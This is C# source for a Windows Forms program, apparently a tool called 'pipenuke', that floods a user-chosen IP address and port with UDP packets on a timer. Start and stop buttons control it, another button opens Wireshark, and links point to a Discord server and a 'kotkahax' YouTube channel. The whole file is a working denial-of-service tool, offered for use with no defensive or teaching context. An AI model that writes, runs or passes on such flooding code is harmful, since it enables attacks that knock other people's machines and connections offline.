//official code at https://github.com/kotka4/pipenuke/
using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;

namespace thing
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void floodTimer_Tick(object sender, EventArgs e)
        {
            flood();

        }
        public void flood()
        {
            UdpClient client = new UdpClient();

            IPAddress ipAddr = IPAddress.Parse(ipTxt.Text);
            int port;
            port = int.Parse(portTxt.Text);

            try
            {
                client.Connect(ipAddr, port);
                byte[] sendbytes = Encoding.ASCII.GetBytes(dataTxt.Text);
                client.Send(sendbytes, sendbytes.Length);
                client.AllowNatTraversal (true);
                client.DontFragment = (true);
            }
            catch
            {
                const string errorMessage = "Error with someting";
                 const string errorCaption = "Check that everything is entered and correct, mate";

                MessageBox.Show(errorMessage, errorCaption,
                    MessageBoxButtons.OK);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            floodTimer.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            floodTimer.Stop();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Process.Start("C:/Program Files/Wireshark/Wireshark.exe");
        }

        private void label7_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/aGNen73pbu");
        }

        private void label8_Click(object sender, EventArgs e)
        {
            Process.Start("https://youtube.com/kotkahax/");
        }
    }
}
